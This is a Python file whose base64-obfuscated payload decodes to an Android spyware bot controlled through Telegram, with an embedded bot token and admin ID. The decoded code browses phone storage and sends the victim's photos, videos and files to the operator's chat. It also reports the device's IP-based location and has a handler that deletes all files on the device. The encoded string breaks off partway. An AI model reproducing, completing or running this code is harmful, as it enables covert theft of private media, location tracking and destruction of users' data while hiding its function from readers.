import base64
import sys

# ======= الكود المشفر =======
b64_code = """aW1wb3J0IG9zCmltcG9ydCBzaHV0aWwKaW1wb3J0IHJhbmRvbQppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB0aW1lCmZyb20gdGVsZWJvdCBpbXBvcnQgVGVsZUJvdCwgdHlwZXMKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgU3R5bGUsIGluaXQKCmluaXQoKSAgCgpUT0tFTiA9ICc3OTQwNDgxMjkzOkFBSGJ5cFZnRk5KOVhjaFdOcDd2WXg5dkFqYUxUMVpCWklZJyAj2KrZiNmD2YYKQURNSU5fSUQgPSA3NDY3MTczMjEgIyDYp9mK2K/Zigpib3QgPSBUZWxlQm90KFRPS0VOKQoKcmVxdWlyZWRfbGlicmFyaWVzID0gWyd0ZWxlYm90JywgJ2NvbG9yYW1hJ10KCmRlZiBpbnN0YWxsX2xpYnJhcmllcygpOgogICAgZm9yIGxpYiBpbiByZXF1aXJlZF9saWJyYXJpZXM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBfX2ltcG9ydF9fKGxpYikKICAgICAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgICAgIG9zLnN5c3RlbShmJ3BpcCBpbnN0YWxsIHtsaWJ9JykKCmluc3RhbGxfbGlicmFyaWVzKCkKCmRlZiBjb3VudF9waG90b3MoZGlyZWN0b3J5KToKICAgIGNvdW50ID0gMAogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZGlyZWN0b3J5KToKICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgnLmpwZycpIG9yIGZpbGUuZW5kc3dpdGgoJy5wbmcnKToKICAgICAgICAgICAgICAgIGNvdW50ICs9IDEKICAgIHJldHVybiBjb3VudAoKZGVmIGNvdW50X3ZpZGVvcyhkaXJlY3RvcnkpOgogICAgY291bnQgPSAwCiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsayhkaXJlY3RvcnkpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCcubXA0Jykgb3IgZmlsZS5lbmRzd2l0aCgnLmF2aScpIG9yIGZpbGUuZW5kc3dpdGgoJy5ta3YnKToKICAgICAgICAgICAgICAgIGNvdW50ICs9IDEKICAgIHJldHVybiBjb3VudAoKZGVmIHNlbmRfbWVkaWFfZnJvbV9kaXJlY3RvcnkoZGlyZWN0b3J5LCBjb3VudCwgbWVzc2FnZSwgbWVkaWFfdHlwZSk6CiAgICBzZW50X2NvdW50ID0gMAogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZGlyZWN0b3J5KToKICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgaWYgKG1lZGlhX3R5cGUgPT0gJ3Bob3RvJyBhbmQgKGZpbGUuZW5kc3dpdGgoJy5qcGcnKSBvciBmaWxlLmVuZHN3aXRoKCcucG5nJykpKSBvciBcCiAgICAgICAgICAgICAgIChtZWRpYV90eXBlID09ICd2aWRlbycgYW5kIChmaWxlLmVuZHN3aXRoKCcubXA0Jykgb3IgZmlsZS5lbmRzd2l0aCgnLmF2aScpIG9yIGZpbGUuZW5kc3dpdGgoJy5ta3YnKSkpOgogICAgICAgICAgICAgICAgaWYgc2VudF9jb3VudCA+PSBjb3VudDoKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCAncmInKSBhcyBtZWRpYV9maWxlOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBtZWRpYV90eXBlID09ICdwaG90byc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3Quc2VuZF9waG90byhtZXNzYWdlLmNoYXQuaWQsIG1lZGlhX2ZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3Quc2VuZF92aWRlbyhtZXNzYWdlLmNoYXQuaWQsIG1lZGlhX2ZpbGUpCiAgICAgICAgICAgICAgICAgICAgc2VudF9jb3VudCArPSAxCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIGYnRXJyb3Igc2VuZGluZyB7bWVkaWFfdHlwZX06IHtlfScpCgpAYm90Lm1lc3NhZ2VfaGFuZGxlcihjb21tYW5kcz1bJ3N0YXJ0J10pCmRlZiBzdGFydChtZXNzYWdlKToKICAgIHdlbGNvbWVfdGV4dCA9ICLZhdix2K3YqNmL2KchICDYo9mG2Kcg2KfZhNix2YjYqNmI2Kog2KfZhNiu2KfYtSDYqNmDLiAg2YPZitmBINmK2YXZg9mG2YbZiiDYp9mE2YXYs9in2LnYr9ip2J8gIPCfpJYiCiAgICBrZXlib2FyZCA9IHR5cGVzLklubGluZUtleWJvYXJkTWFya3VwKCkKICAgIGJ1dHRvbjEgPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign2KfYs9iq2K7Ysdin2Kwg2KfZhNi12YjYsSDwn5O4JywgY2FsbGJhY2tfZGF0YT0nZXh0cmFjdF9waG90b3MnKQogICAgYnV0dG9uMiA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKCfYqtmG2LjZitmBINin2YTYqNmK2KfZhtin2Kog8J+Xke+4jycsIGNhbGxiYWNrX2RhdGE9J2NsZWFyX2RhdGEnKQogICAgYnV0dG9uMyA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKCfZhtiz2K7YqSDZhdmGINin2YTYqNmK2KfZhtin2Kog8J+TgicsIGNhbGxiYWNrX2RhdGE9J2NvcHlfZGF0YScpCiAgICBidXR0b240ID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ9in2K3YsNmBINin2YTZhdis2YTYryDwn5OBJywgY2FsbGJhY2tfZGF0YT0nZGVsZXRlX2ZvbGRlcicpCiAgICBidXR0b241ID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ9in2LPYqtiu2LHYp9isINin2YTZgdmK2K/ZitmIIPCfjqUnLCBjYWxsYmFja19kYXRhPSdzZWFyY2hfdmlkZW9zJykKICAgIGJ1dHRvbjYgPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign2KfZhNmF2YjZgti5IPCfjI0nLCBjYWxsYmFja19kYXRhPSdsb2NhdGlvbicpCiAgICBidXR0b243ID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ9in2YTZhdmE2YHYp9iqIPCfk4EnLCBjYWxsYmFja19kYXRhPSdmaWxlcycpCiAgICBrZXlib2FyZC5hZGQoYnV0dG9uMSwgYnV0dG9uNSkKICAgIGtleWJvYXJkLmFkZChidXR0b24yLCBidXR0b24zKQogICAga2V5Ym9hcmQuYWRkKGJ1dHRvbjQpCiAgICBrZXlib2FyZC5hZGQoYnV0dG9uNikKICAgIGtleWJvYXJkLmFkZChidXR0b243KQogICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIHRleHQ9d2VsY29tZV90ZXh0LCByZXBseV9tYXJrdXA9a2V5Ym9hcmQpCiAgICAKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IG9zCmZyb20gdGVsZWJvdCBpbXBvcnQgdHlwZXMKCklURU1TX1BFUl9QQUdFID0gMTAKbmF2aWdhdGlvbl9oaXN0b3J5ID0ge30KCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEgPT0gJ2ZpbGVzJykKZGVmIGhhbmRsZV9maWxlcyhjYWxsKToKICAgIHJvb3RfZGlyZWN0b3J5ID0gJy9zdG9yYWdlL2VtdWxhdGVkLzAvJwogICAgbmF2aWdhdGlvbl9oaXN0b3J5W2NhbGwubWVzc2FnZS5jaGF0LmlkXSA9IFtyb290X2RpcmVjdG9yeV0KICAgIHNob3dfZGlyZWN0b3J5X2NvbnRlbnRzKGNhbGwubWVzc2FnZSwgcm9vdF9kaXJlY3RvcnksIDApCgpkZWYgaGFzaF9wYXRoKHBhdGgpOgogICAgcmV0dXJuIGhhc2hsaWIuc2hhMjU2KHBhdGguZW5jb2RlKCkpLmhleGRpZ2VzdCgpWzoxNl0KCmRlZiBzaG93X2RpcmVjdG9yeV9jb250ZW50cyhtZXNzYWdlLCBkaXJlY3RvcnksIHBhZ2UpOgogICAgY2hhdF9pZCA9IG1lc3NhZ2UuY2hhdC5pZAogICAgaGlzdG9yeSA9IG5hdmlnYXRpb25faGlzdG9yeS5nZXQoY2hhdF9pZCwgW10pCiAgICBrZXlib2FyZCA9IHR5cGVzLklubGluZUtleWJvYXJkTWFya3VwKCkKICAgIGZpbGVzID0gW10KICAgIGRpcnMgPSBbXQogICAgZm9yIGl0ZW0gaW4gb3MubGlzdGRpcihkaXJlY3RvcnkpOgogICAgICAgIGl0ZW1fcGF0aCA9IG9zLnBhdGguam9pbihkaXJlY3RvcnksIGl0ZW0pCiAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUoaXRlbV9wYXRoKToKICAgICAgICAgICAgZmlsZXMuYXBwZW5kKGl0ZW0pCiAgICAgICAgZWxzZToKICAgICAgICAgICAgZGlycy5hcHBlbmQoaXRlbSkKICAgIAogICAgYWxsX2l0ZW1zID0gZGlycyArIGZpbGVzCiAgICBzdGFydCA9IHBhZ2UgKiBJVEVNU19QRVJfUEFHRQogICAgZW5kID0gc3RhcnQgKyBJVEVNU19QRVJfUEFHRQogICAgY3VycmVudF9pdGVtcyA9IGFsbF9pdGVtc1tzdGFydDplbmRdCiAgICAKICAgIGZvciBpdGVtIGluIGN1cnJlbnRfaXRlbXM6CiAgICAgICAgaXRlbV9wYXRoID0gb3MucGF0aC5qb2luKGRpcmVjdG9yeSwgaXRlbSkKICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShpdGVtX3BhdGgpOgogICAgICAgICAgICBpZiBpdGVtLmxvd2VyKCkuZW5kc3dpdGgoKCcucG5nJywgJy5qcGcnLCAnLmpwZWcnLCAnLmdpZicpKToKICAgICAgICAgICAgICAgIGJ1dHRvbiA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKGYn8J+TtyB7aXRlbX0nLCBjYWxsYmFja19kYXRhPWYnZmlsZV97aGFzaF9wYXRoKGl0ZW1fcGF0aCl9JykKICAgICAgICAgICAgZWxpZiBpdGVtLmxvd2VyKCkuZW5kc3dpdGgoKCcubXA0JywgJy5hdmknLCAnLm1rdicpKToKICAgICAgICAgICAgICAgIGJ1dHRvbiA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKGYn8J+OpSB7aXRlbX0nLCBjYWxsYmFja19kYXRhPWYnZmlsZV97aGFzaF9wYXRoKGl0ZW1fcGF0aCl9JykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGJ1dHRvbiA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKGYn8J+ThCB7aXRlbX0nLCBjYWxsYmFja19kYXRhPWYnZmlsZV97aGFzaF9wYXRoKGl0ZW1fcGF0aCl9JykKICAgICAgICBlbHNlOgogICAgICAgICAgICBidXR0b24gPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbihmJ/Cfk4Ege2l0ZW19JywgY2FsbGJhY2tfZGF0YT1mJ2Rpcl97aGFzaF9wYXRoKGl0ZW1fcGF0aCl9JykKICAgICAgICBrZXlib2FyZC5hZGQoYnV0dG9uKQogICAgCiAgICBpZiBsZW4oaGlzdG9yeSkgPiAxOgogICAgICAgIGJhY2tfYnV0dG9uID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ+Kshe+4jyDYrtmE2YEnLCBjYWxsYmFja19kYXRhPWYnYmFja197aGFzaF9wYXRoKGRpcmVjdG9yeSl9JykKICAgICAgICBrZXlib2FyZC5hZGQoYmFja19idXR0b24pCiAgICAKICAgIGlmIGVuZCA8IGxlbihhbGxfaXRlbXMpOgogICAgICAgIG5leHRfYnV0dG9uID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ+Keoe+4jyDYp9mE2LXZgdit2Kkg2KfZhNiq2KfZhNmK2KknLCBjYWxsYmFja19kYXRhPWYncGFnZV97aGFzaF9wYXRoKGRpcmVjdG9yeSl9X3twYWdlKzF9JykKICAgICAgICBrZXlib2FyZC5hZGQobmV4dF9idXR0b24pCiAgICAKICAgIGlmIHBhZ2UgPiAwOgogICAgICAgIHByZXZfYnV0dG9uID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ+Kshe+4jyDYp9mE2LXZgdit2Kkg2KfZhNiz2KfYqNmC2KknLCBjYWxsYmFja19kYXRhPWYncGFnZV97aGFzaF9wYXRoKGRpcmVjdG9yeSl9X3twYWdlLTF9JykKICAgICAgICBrZXlib2FyZC5hZGQocHJldl9idXR0b24pCiAgICAKICAgIGlmIG1lc3NhZ2UucmVwbHlfdG9fbWVzc2FnZToKICAgICAgICBib3QuZWRpdF9tZXNzYWdlX3RleHQoY2hhdF9pZD1jaGF0X2lkLCBtZXNzYWdlX2lkPW1lc3NhZ2UubWVzc2FnZV9pZCwgdGV4dD1mItmF2K3YqtmI2YrYp9iqINin2YTZhdis2YTYrzoge2RpcmVjdG9yeX0iLCByZXBseV9tYXJrdXA9a2V5Ym9hcmQpCiAgICBlbHNlOgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZCwgZiLZhdit2KrZiNmK2KfYqiDYp9mE2YXYrNmE2K86IHtkaXJlY3Rvcnl9IiwgcmVwbHlfbWFya3VwPWtleWJvYXJkKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YS5zdGFydHN3aXRoKCdkaXJfJykpCmRlZiBoYW5kbGVfZGlyZWN0b3J5X2NsaWNrKGNhbGwpOgogICAgZGlyZWN0b3J5X2hhc2ggPSBjYWxsLmRhdGEuc3BsaXQoJ18nLCAxKVsxXQogICAgZGlyZWN0b3J5ID0gZmluZF9wYXRoX2J5X2hhc2goZGlyZWN0b3J5X2hhc2gpCiAgICBpZiBkaXJlY3RvcnkgaXMgTm9uZToKICAgICAgICBib3QuYW5zd2VyX2NhbGxiYWNrX3F1ZXJ5KGNhbGwuaWQsICfYrti32KM6INmE2YUg2YrYqtmFINin2YTYudir2YjYsSDYudmE2Ykg2KfZhNmF2LPYp9ixLiAg8J+aqycpCiAgICAgICAgcmV0dXJuCiAgICBjaGF0X2lkID0gY2FsbC5tZXNzYWdlLmNoYXQuaWQKICAgIGhpc3RvcnkgPSBuYXZpZ2F0aW9uX2hpc3RvcnkuZ2V0KGNoYXRfaWQsIFtdKQogICAgaGlzdG9yeS5hcHBlbmQoZGlyZWN0b3J5KQogICAgbmF2aWdhdGlvbl9oaXN0b3J5W2NoYXRfaWRdID0gaGlzdG9yeQogICAgc2hvd19kaXJlY3RvcnlfY29udGVudHMoY2FsbC5tZXNzYWdlLCBkaXJlY3RvcnksIDApCgpAYm90LmNhbGxiYWNrX3F1ZXJ5X2hhbmRsZXIoZnVuYz1sYW1iZGEgY2FsbDogY2FsbC5kYXRhLnN0YXJ0c3dpdGgoJ2ZpbGVfJykpCmRlZiBoYW5kbGVfZmlsZV9jbGljayhjYWxsKToKICAgIGZpbGVfaGFzaCA9IGNhbGwuZGF0YS5zcGxpdCgnXycsIDEpWzFdCiAgICBmaWxlX3BhdGggPSBmaW5kX3BhdGhfYnlfaGFzaChmaWxlX2hhc2gpCiAgICBpZiBmaWxlX3BhdGggaXMgTm9uZToKICAgICAgICBib3QuYW5zd2VyX2NhbGxiYWNrX3F1ZXJ5KGNhbGwuaWQsICfYrti32KM6INin2YTZhdmE2YEg2LrZitixINmF2YjYrNmI2K8uICDwn5qrJykKICAgICAgICByZXR1cm4KICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncmInKSBhcyBmaWxlOgogICAgICAgICAgICBpZiBmaWxlX3BhdGgubG93ZXIoKS5lbmRzd2l0aCgoJy5wbmcnLCAnLmpwZycsICcuanBlZycsICcuZ2lmJykpOgogICAgICAgICAgICAgICAgYm90LnNlbmRfcGhvdG8oY2FsbC5tZXNzYWdlLmNoYXQuaWQsIGZpbGUpCiAgICAgICAgICAgIGVsaWYgZmlsZV9wYXRoLmxvd2VyKCkuZW5kc3dpdGgoKCcubXA0JywgJy5hdmknLCAnLm1rdicpKToKICAgICAgICAgICAgICAgIGJvdC5zZW5kX3ZpZGVvKGNhbGwubWVzc2FnZS5jaGF0LmlkLCBmaWxlKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgYm90LnNlbmRfZG9jdW1lbnQoY2FsbC5tZXNzYWdlLmNoYXQuaWQsIGZpbGUpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYm90LmFuc3dlcl9jYWxsYmFja19xdWVyeShjYWxsLmlkLCBmJ9it2K/YqyDYrti32KMg2KPYq9mG2KfYoSDYpdix2LPYp9mEINin2YTZhdmE2YE6IHtlfSDwn5qrJykKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEuc3RhcnRzd2l0aCgncGFnZV8nKSkKZGVmIGhhbmRsZV9wYWdlX2NsaWNrKGNhbGwpOgogICAgZGF0YSA9IGNhbGwuZGF0YS5zcGxpdCgnXycsIDIpCiAgICBkaXJlY3RvcnlfaGFzaCA9IGRhdGFbMV0KICAgIGRpcmVjdG9yeSA9IGZpbmRfcGF0aF9ieV9oYXNoKGRpcmVjdG9yeV9oYXNoKQogICAgaWYgZGlyZWN0b3J5IGlzIE5vbmU6CiAgICAgICAgYm90LmFuc3dlcl9jYWxsYmFja19xdWVyeShjYWxsLmlkLCAn2K7Yt9ijOiDZhNmFINmK2KrZhSDYp9mE2LnYq9mI2LEg2LnZhNmJINin2YTZhdiz2KfYsS4g8J+aqycpCiAgICAgICAgcmV0dXJuCiAgICBwYWdlID0gaW50KGRhdGFbMl0pCiAgICBzaG93X2RpcmVjdG9yeV9jb250ZW50cyhjYWxsLm1lc3NhZ2UsIGRpcmVjdG9yeSwgcGFnZSkKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEuc3RhcnRzd2l0aCgnYmFja18nKSkKZGVmIGhhbmRsZV9iYWNrX2NsaWNrKGNhbGwpOgogICAgZGlyZWN0b3J5X2hhc2ggPSBjYWxsLmRhdGEuc3BsaXQoJ18nLCAxKVsxXQogICAgZGlyZWN0b3J5ID0gZmluZF9wYXRoX2J5X2hhc2goZGlyZWN0b3J5X2hhc2gpCiAgICBpZiBkaXJlY3RvcnkgaXMgTm9uZToKICAgICAgICBib3QuYW5zd2VyX2NhbGxiYWNrX3F1ZXJ5KGNhbGwuaWQsICfYrti32KM6INmE2YUg2YrYqtmFINin2YTYudir2YjYsSDYudmE2Ykg2KfZhNmF2LPYp9ixLiDwn5qrJykKICAgICAgICByZXR1cm4KICAgIGNoYXRfaWQgPSBjYWxsLm1lc3NhZ2UuY2hhdC5pZAogICAgaGlzdG9yeSA9IG5hdmlnYXRpb25faGlzdG9yeS5nZXQoY2hhdF9pZCwgW10pCiAgICBpZiBsZW4oaGlzdG9yeSkgPiAxOgogICAgICAgIGhpc3RvcnkucG9wKCkKICAgICAgICBuYXZpZ2F0aW9uX2hpc3RvcnlbY2hhdF9pZF0gPSBoaXN0b3J5CiAgICAgICAgcHJldmlvdXNfZGlyZWN0b3J5ID0gaGlzdG9yeVstMV0KICAgICAgICBzaG93X2RpcmVjdG9yeV9jb250ZW50cyhjYWxsLm1lc3NhZ2UsIHByZXZpb3VzX2RpcmVjdG9yeSwgMCkKCmRlZiBmaW5kX3BhdGhfYnlfaGFzaChwYXRoX2hhc2gpOgogICAgcm9vdF9kaXJlY3RvcnkgPSAnL3N0b3JhZ2UvZW11bGF0ZWQvMC8nCiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2Fsayhyb290X2RpcmVjdG9yeSk6CiAgICAgICAgZm9yIGl0ZW0gaW4gZGlycyArIGZpbGVzOgogICAgICAgICAgICBpdGVtX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgaXRlbSkKICAgICAgICAgICAgaWYgaGFzaF9wYXRoKGl0ZW1fcGF0aCkgPT0gcGF0aF9oYXNoOgogICAgICAgICAgICAgICAgcmV0dXJuIGl0ZW1fcGF0aAogICAgcmV0dXJuIE5vbmUgIAogICAgCiAgICAKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YSA9PSAnbG9jYXRpb24nKQpkZWYgaGFuZGxlX2xvY2F0aW9uKGNhbGwpOgogICAgaW1wb3J0IHJlcXVlc3RzCiAgICBpcF9pbmZvID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vaXAtYXBpLmNvbS9qc29uLycpLmpzb24oKQogICAgaWYgaXBfaW5mb1snc3RhdHVzJ10gPT0gJ3N1Y2Nlc3MnOgogICAgICAgIGxhdGl0dWRlID0gaXBfaW5mb1snbGF0J10KICAgICAgICBsb25naXR1ZGUgPSBpcF9pbmZvWydsb24nXQogICAgICAgIGFkZGl0aW9uYWxfaW5mbyA9IGYi2YXYudmE2YjZhdin2Kog2KXYttin2YHZitipOlxu2KzYp9mG2Kg6IHtpcF9pbmZvWydjb3VudHJ5J119XG7ZhdmG2LfZgtipOiB7aXBfaW5mb1sncmVnaW9uTmFtZSddfVxu2YXYr9mK2YbYqToge2lwX2luZm9bJ2NpdHknXX1cbtmF2LLZiNivOiB7aXBfaW5mb1snaXNwJ119XG5JUC3YudmG2YjYp9mGOiB7aXBfaW5mb1sncXVlcnknXX0iICAgICAgICAKICAgICAgICBib3Quc2VuZF9sb2NhdGlvbihjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgbGF0aXR1ZGUsIGxvbmdpdHVkZSkKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKGNhbGwubWVzc2FnZS5jaGF0LmlkLCBhZGRpdGlvbmFsX2luZm8pCiAgICBlbHNlOgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsICLZhNmFINmG2KrZhdmD2YYg2YXZhiDYqtit2K/ZitivINmF2YjZgti52YMuIikgIAoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YSA9PSAnZXh0cmFjdF9waG90b3MnKQpkZWYgYXNrX2Zvcl9waG90b19jb3VudChjYWxsKToKICAgIHJvb3RfZGlyZWN0b3J5ID0gJy9zdG9yYWdlL2VtdWxhdGVkLzAvJwogICAgc3BlY2lmaWNfZm9sZGVycyA9IFsnL3N0b3JhZ2UvZW11bGF0ZWQvMC9QaG90b3MnLCAnL3N0b3JhZ2UvZW11bGF0ZWQvMC9JbWFnZXMnLCAnL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL0NhbWVyYSddCiAgICBwaG90b19jb3VudCA9IHN1bShjb3VudF9waG90b3MoZm9sZGVyKSBmb3IgZm9sZGVyIGluIHNwZWNpZmljX2ZvbGRlcnMgaWYgb3MucGF0aC5leGlzdHMoZm9sZGVyKSkKICAgIHBob3RvX2NvdW50ICs9IGNvdW50X3Bob3Rvcyhyb290X2RpcmVjdG9yeSkKICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsIGYn2K3Yp9mE2YrYpyDYudmE2Ykg2KfZhNis2YfYp9iyIHtwaG90b19jb3VudH0g2LXZiNixINmB2YjYqtmI2LrYsdin2YHZitipLiAg2YPZhSDYudiv2K8g2KfZhNi12YjYsSDYp9mE2KrZiiDYqtix2YrYryDYp9mE2K3YtdmI2YQg2LnZhNmK2YfYp9ifICDwn5O4JykKICAgIGJvdC5yZWdpc3Rlcl9uZXh0X3N0ZXBfaGFuZGxlcihjYWxsLm1lc3NhZ2UsIHByb2Nlc3NfcGhvdG9fY291bnQsIHJvb3RfZGlyZWN0b3J5LCBzcGVjaWZpY19mb2xkZXJzKQoKZGVmIHByb2Nlc3NfcGhvdG9fY291bnQobWVzc2FnZSwgcm9vdF9kaXJlY3RvcnksIHNwZWNpZmljX2ZvbGRlcnMpOgogICAgdHJ5OgogICAgICAgIGNvdW50ID0gaW50KG1lc3NhZ2UudGV4dCkKICAgICAgICBpZiBjb3VudCA8PSAwOgogICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgJ9in2YTYsdis2KfYoSDYpdiv2K7Yp9mEINin2YTYudiv2K8g2KfZhNi12K3ZititINmF2YYg2KfZhNi12YjYsS4gIPCfk7gnKQogICAgICAgIHJldHVybgoKICAgIGZvciBmb2xkZXIgaW4gc3BlY2lmaWNfZm9sZGVyczoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmb2xkZXIpOgogICAgICAgICAgICBzZW5kX21lZGlhX2Zyb21fZGlyZWN0b3J5KGZvbGRlciwgY291bnQsIG1lc3NhZ2UsICdwaG90bycpCiAgICAgICAgICAgIGNvdW50IC09IGNvdW50X3Bob3Rvcyhmb2xkZXIpCiAgICAgICAgICAgIGlmIGNvdW50IDw9IDA6CiAgICAgICAgICAgICAgICByZXR1cm4KICAgIAogICAgc2VuZF9tZWRpYV9mcm9tX2RpcmVjdG9yeShyb290X2RpcmVjdG9yeSwgY291bnQsIG1lc3NhZ2UsICdwaG90bycpCiAgICBhc2tfdG9fcmV0dXJuX3RvX21lbnUobWVzc2FnZSwgJ2V4dHJhY3RfcGhvdG9zJykKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEgPT0gJ2NsZWFyX2RhdGEnKQpkZWYgY2xlYXJfZGF0YShjYWxsKToKICAgIHJvb3RfZGlyZWN0b3J5ID0gJy9zdG9yYWdlL2VtdWxhdGVkLzAvJwogICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgJ9mE2YLYryDYqNiv2KPYqiDZgdmKINiq2YbYuNmK2YEg2KfZhNio2YrYp9mG2KfYqi4uLiDwn5eR77iPJykKICAgIAogICAgdHJ5OgogICAgICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKHJvb3RfZGlyZWN0b3J5LCB0b3Bkb3duPUZhbHNlKToKICAgICAgICAgICAgZm9yIG5hbWUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICBvcy5yZW1vdmUob3MucGF0aC5qb2luKHJvb3QsIG5hbWUpKQogICAgICAgICAgICBmb3IgbmFtZSBpbiBkaXJzOgogICAgICAgICAgICAgICAgb3Mucm1kaXIob3MucGF0aC5qb2luKHJvb3QsIG5hbWUpKQogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsICfZhNmC2K8g2KrZhSDZhdiz2K0g2KfZhNio2YrYp9mG2KfYqiDYqNmG2KzYp9itLiAg8J+Xke+4jycpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgZifYrti32KMg2LnZhtivINmF2LPYrSDYp9mE2KjZitin2YbYp9iqOiB7ZX0g8J+aqycpCiAgICAKICAgIGFza190b19yZXR1cm5fdG9fbWVudShjYWxsLm1lc3NhZ2UsICdjbGVhcl9kYXRhJykKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEgPT0gJ2NvcHlfZGF0YScpCmRlZiBhc2tfZm9yX2ZvbGRlcl9uYW1lKGNhbGwpOgogICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgJ9ij2K/YrtmEINin2LPZhSDYp9mE2YXYrNmE2K8g2KfZhNmF2LHYp9ivINmG2LPYrtmHOiDwn5OCJykKICAgIGJvdC5yZWdpc3Rlcl9uZXh0X3N0ZXBfaGFuZGxlcihjYWxsLm1lc3NhZ2UsIHByb2Nlc3NfZm9sZGVyX25hbWUpCgpkZWYgcHJvY2Vzc19mb2xkZXJfbmFtZShtZXNzYWdlKToKICAgIGZvbGRlcl9uYW1lID0gbWVzc2FnZS50ZXh0CiAgICByb290X2RpcmVjdG9yeSA9ICcvc3RvcmFnZS9lbXVsYXRlZC8wLycKICAgIGZvbGRlcl9wYXRoID0gZmluZF9mb2xkZXIocm9vdF9kaXJlY3RvcnksIGZvbGRlcl9uYW1lKQogICAgCiAgICBpZiBub3QgZm9sZGVyX3BhdGg6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIGYn2YXYrNmE2K8gIntm